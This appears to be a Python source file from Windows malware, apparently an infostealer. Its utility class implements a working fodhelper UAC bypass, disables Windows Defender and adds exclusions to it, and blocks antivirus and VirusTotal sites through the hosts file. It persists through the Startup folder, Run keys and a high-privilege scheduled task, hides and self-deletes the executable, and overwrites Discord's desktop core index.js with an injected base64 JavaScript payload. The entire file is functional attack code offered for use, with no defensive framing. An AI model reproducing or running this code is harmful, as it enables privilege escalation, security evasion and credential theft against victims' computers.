import base64
import ctypes
import logging
import os
import random
import shutil
import string
import subprocess
import sys
import time
import winreg


class Utility:
    _logger = logging.getLogger('Utility')

    @staticmethod
    def IsAdmin() -> bool:
        """Check if running as administrator via shell32.IsUserAnAdmin()."""
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        """Returns (exe_path, is_frozen). is_frozen indicates PyInstaller bundle."""
        is_frozen = hasattr(sys, '_MEIPASS')
        if is_frozen:
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
        return exe_path, is_frozen

    @staticmethod
    def IsConnectedToInternet() -> bool:
        """Try connecting to google.com to check internet connectivity."""
        try:
            import urllib.request
            urllib.request.urlopen('http://www.google.com', timeout=5)
            return True
        except Exception:
            return False

    @staticmethod
    def UACbypass() -> bool:
        """fodhelper.exe UAC bypass.
        
        Sets a registry handler for ms-settings protocol to re-launch ourselves
        with elevated privileges via fodhelper.exe, which auto-elevates.
        """
        try:
            exe_path, _ = Utility.GetSelf()
            cmd = f'"{exe_path}" {" ".join(sys.argv[1:])} --nouacbypass'

            reg_path = r'Software\Classes\ms-settings\Shell\Open\command'

            # Create the registry key and set default value to our command
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
            winreg.CloseKey(key)

            # Launch fodhelper which will trigger our ms-settings handler
            subprocess.Popen(
                'fodhelper.exe',
                creationflags=0x08000000,  # CREATE_NO_WINDOW
                shell=True
            )

            time.sleep(3)

            # Clean up the registry key
            try:
                winreg.DeleteKeyEx(
                    winreg.HKEY_CURRENT_USER,
                    r'Software\Classes\ms-settings\Shell\Open\command',
                    winreg.KEY_ALL_ACCESS, 0
                )
            except Exception:
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell\Open\command')
                except Exception:
                    pass
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell\Open')
            except Exception:
                pass
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell')
            except Exception:
                pass
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
            except Exception:
                pass

            return True
        except Exception as exc:
            Utility._logger.error(f'UAC bypass failed: {exc}')
            return False

    @staticmethod
    def UACPrompt(exe_path: str) -> bool:
        """Launch exe_path with 'runas' verb via ShellExecuteW. Returns True if accepted."""
        try:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, 'runas', exe_path, ' '.join(sys.argv[1:]), None, 1  # SW_SHOWNORMAL
            )
            # ShellExecuteW returns > 32 on success
            return result > 32
        except Exception as exc:
            Utility._logger.error(f'UAC prompt failed: {exc}')
            return False

    @staticmethod
    def ExcludeFromDefender(path: str = None) -> None:
        """Add a Windows Defender exclusion for the given path."""
        try:
            if path is None:
                path = sys.executable
            subprocess.run(
                [
                    'powershell', '-WindowStyle', 'Hidden', '-Command',
                    f'Add-MpPreference -ExclusionPath "{path}" -Force'
                ],
                capture_output=True,
                creationflags=0x08000000
            )
        except Exception as exc:
            Utility._logger.error(f'Defender exclusion failed: {exc}')

    @staticmethod
    def DisableDefender() -> None:
        """Attempt to disable Windows Defender real-time protection and telemetry."""
        commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -MAPSReporting 0',
            'Set-MpPreference -SubmitSamplesConsent 2',
        ]
        for cmd in commands:
            try:
                subprocess.run(
                    ['powershell', '-WindowStyle', 'Hidden', '-Command', cmd],
                    capture_output=True,
                    creationflags=0x08000000
                )
            except Exception as exc:
                Utility._logger.error(f'DisableDefender cmd failed: {exc}')

    @staticmethod
    def BlockAvSites() -> None:
        """Append entries to the hosts file blocking known AV/security vendor domains."""
        domains = [
            'virustotal.com', 'avast.com', 'avg.com', 'avira.com',
            'bitdefender.com', 'kaspersky.com', 'malwarebytes.com',
            'mcafee.com', 'norton.com', 'sophos.com', 'trendmicro.com',
            'eset.com', 'comodo.com', 'drweb.com', 'f-secure.com',
            'pandasecurity.com', 'clamav.net', 'zonealarm.com',
        ]
        hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
        try:
            existing = ''
            try:
                with open(hosts_path, 'r', encoding='utf-8') as f:
                    existing = f.read()
            except Exception:
                pass

            lines_to_add = []
            for domain in domains:
                entry_bare = f'0.0.0.0 {domain}'
                entry_www = f'0.0.0.0 www.{domain}'
                if entry_bare not in existing:
                    lines_to_add.append(entry_bare)
                if entry_www not in existing:
                    lines_to_add.append(entry_www)

            if lines_to_add:
                with open(hosts_path, 'a', encoding='utf-8') as f:
                    f.write('\n' + '\n'.join(lines_to_add) + '\n')
        except Exception as exc:
            Utility._logger.error(f'BlockAvSites failed: {exc}')

    @staticmethod
    def _random_name(length: int = 12) -> str:
        """Generate a random alphanumeric string."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @staticmethod
    def PutInStartup() -> str | None:
        """Copy self to Startup folder and set a Run registry key for persistence."""
        try:
            exe_path, _ = Utility.GetSelf()
            rand_name = Utility._random_name() + '.exe'

            # Copy to Startup folder
            startup_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            os.makedirs(startup_dir, exist_ok=True)
            startup_path = os.path.join(startup_dir, rand_name)
            shutil.copy2(exe_path, startup_path)

            # Set registry Run key
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r'Software\Microsoft\Windows\CurrentVersion\Run',
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, rand_name.replace('.exe', ''), 0, winreg.REG_SZ, startup_path)
                winreg.CloseKey(key)
            except Exception as exc:
                Utility._logger.error(f'Registry run key failed: {exc}')

            return startup_path
        except Exception as exc:
            Utility._logger.error(f'PutInStartup failed: {exc}')
            return None

    @staticmethod
    def CreateScheduledTask() -> bool:
        """Create a scheduled task that runs on logon with highest privileges."""
        try:
            exe_path, _ = Utility.GetSelf()
            task_name = 'Phantom_' + Utility._random_name(8)
            result = subprocess.run(
                [
                    'schtasks', '/create',
                    '/tn', task_name,
                    '/tr', f'"{exe_path}"',
                    '/sc', 'onlogon',
                    '/rl', 'highest',
                    '/f'
                ],
                capture_output=True,
                creationflags=0x08000000
            )
            return result.returncode == 0
        except Exception as exc:
            Utility._logger.error(f'CreateScheduledTask failed: {exc}')
            return False

    @staticmethod
    def IsInStartup(path: str = None) -> bool:
        """Check if the executable is already in startup (folder or registry)."""
        try:
            if path is None:
                path, _ = Utility.GetSelf()

            basename = os.path.basename(path)

            # Check startup folder
            startup_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            if os.path.isdir(startup_dir):
                for item in os.listdir(startup_dir):
                    if item.lower() == basename.lower():
                        return True

            # Check registry run key
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r'Software\Microsoft\Windows\CurrentVersion\Run',
                    0, winreg.KEY_READ
                )
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        if path.lower() in value.lower():
                            winreg.CloseKey(key)
                            return True
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except Exception:
                pass

            return False
        except Exception:
            return False

    @staticmethod
    def HideSelf() -> None:
        """Set the executable's file attributes to hidden + system."""
        try:
            exe_path, _ = Utility.GetSelf()
            subprocess.run(
                ['attrib', '+h', '+s', exe_path],
                capture_output=True,
                creationflags=0x08000000
            )
        except Exception as exc:
            Utility._logger.error(f'HideSelf failed: {exc}')

    @staticmethod
    def DeleteSelf() -> None:
        """Self-delete by spawning a bat file that waits, deletes the exe, then itself."""
        try:
            exe_path, _ = Utility.GetSelf()
            bat_name = Utility._random_name() + '.bat'
            bat_path = os.path.join(os.environ.get('TEMP', '.'), bat_name)

            bat_content = f'''@echo off
ping 127.0.0.1 -n 3 > nul
del /f /q "{exe_path}"
del /f /q "%~f0"
'''
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(bat_content)

            subprocess.Popen(
                bat_path,
                creationflags=0x08000000,
                shell=True
            )
            sys.exit(0)
        except Exception as exc:
            Utility._logger.error(f'DeleteSelf failed: {exc}')

    @staticmethod
    def InjectDiscord(injection_b64: str) -> None:
        """Find Discord installations, decode and write JS injection to discord_desktop_core/index.js.
        
        Targets: discord, discordcanary, discordptb
        Navigates: <appdata>/<variant>/<latest_version>/modules/discord_desktop_core-*/discord_desktop_core/
        """
        try:
            injection_js = base64.b64decode(injection_b64).decode('utf-8')
        except Exception as exc:
            Utility._logger.error(f'Failed to decode injection payload: {exc}')
            return

        appdata = os.environ.get('APPDATA', '')
        discord_variants = ['discord', 'discordcanary', 'discordptb']

        for variant in discord_variants:
            variant_path = os.path.join(appdata, variant)
            if not os.path.isdir(variant_path):
                continue

            try:
                # Find the latest version directory (e.g., 0.0.330)
                version_dirs = []
                for item in os.listdir(variant_path):
                    full = os.path.join(variant_path, item)
                    if os.path.isdir(full) and item.startswith('0.'):
                        version_dirs.append(full)

                if not version_dirs:
                    continue

                # Sort by modification time, take the latest
                version_dirs.sort(key=os.path.getmtime, reverse=True)
                latest_version = version_dirs[0]

                # Find discord_desktop_core module
                modules_path = os.path.join(latest_version, 'modules')
                if not os.path.isdir(modules_path):
                    continue

                core_dir = None
                for mod in os.listdir(modules_path):
                    if mod.startswith('discord_desktop_core'):
                        candidate = os.path.join(modules_path, mod, 'discord_desktop_core')
                        if os.path.isdir(candidate):
                            core_dir = candidate
                            break

                if core_dir is None:
                    continue

                index_js_path = os.path.join(core_dir, 'index.js')

                # Write the injection
                with open(index_js_path, 'w', encoding='utf-8') as f:
                    f.write(injection_js)

                Utility._logger.debug(f'Injected into {variant} at {index_js_path}')

            except Exception as exc:
                Utility._logger.error(f'Discord injection failed for {variant}: {exc}')
